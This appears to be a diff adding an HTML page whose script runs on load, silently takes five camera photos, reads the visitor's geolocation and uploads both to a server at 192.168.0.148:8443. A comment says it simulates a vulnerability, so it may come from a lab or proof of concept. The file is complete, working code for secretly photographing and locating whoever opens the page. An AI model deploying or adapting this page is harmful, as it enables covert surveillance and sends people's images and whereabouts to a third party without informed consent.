@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capture Photo and Location</title>
+</head>
+<body>
+    <script>
+        async function capturePhotoAndLocation() {
+            try {
+                // Access the camera
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                // Function to capture a photo
+                const capturePhoto = async (index) => {
+                    // Create a canvas to capture the photo
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // Convert canvas to Blob
+                    return new Promise((resolve) => {
+                        canvas.toBlob((blob) => {
+                            resolve({ blob, index });
+                        }, 'image/jpeg');
+                    });
+                };
+
+                // Capture 5 photos in quick succession
+                const photos = [];
+                for (let i = 1; i <= 5; i++) {
+                    const photo = await capturePhoto(i);
+                    photos.push(photo);
+                    await new Promise((resolve) => setTimeout(resolve, 400)); // Wait 400ms between captures
+                }
+
+                // Stop video stream
+                stream.getTracks().forEach(track => track.stop());
+
+                // Get location
+                navigator.geolocation.getCurrentPosition(async function(position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    const location = `Latitude: ${latitude}, Longitude: ${longitude}`;
+
+                    // Send each photo to the server with the location
+                    for (const photo of photos) {
+                        // Create form data
+                        const formData = new FormData();
+                        formData.append('photo', photo.blob, `photo${photo.index}.jpg`);
+                        formData.append('location', location);
+
+                        // Send data to backend
+                        try {
+                            const response = await fetch('https://192.168.0.148:8443/capture', {
+                                method: 'POST',
+                                body: formData
+                            });
+
+                            if (response.ok) {
+                                const result = await response.text();
+                                console.log(`Photo ${photo.index} uploaded successfully:`, result);
+                            } else {
+                                console.error(`Failed to send photo ${photo.index}:`, response.status, response.statusText);
+                            }
+                        } catch (error) {
+                            console.error(`Fetch error for photo ${photo.index}:`, error);
+                        }
+                    }
+
+                    alert('Photos and location sent successfully');
+                }, function(error) {
+                    console.error('Error getting location:', error);
+                    alert(`Error getting location: ${error.message}`);
+                });
+            } catch (err) {
+                console.error('Error accessing camera or location:', err);
+                alert('Error accessing camera or location');
+            }
+        }
+
+        // Automatically run the function to simulate the vulnerability
+        capturePhotoAndLocation();
+    </script>
+</body>
+</html>
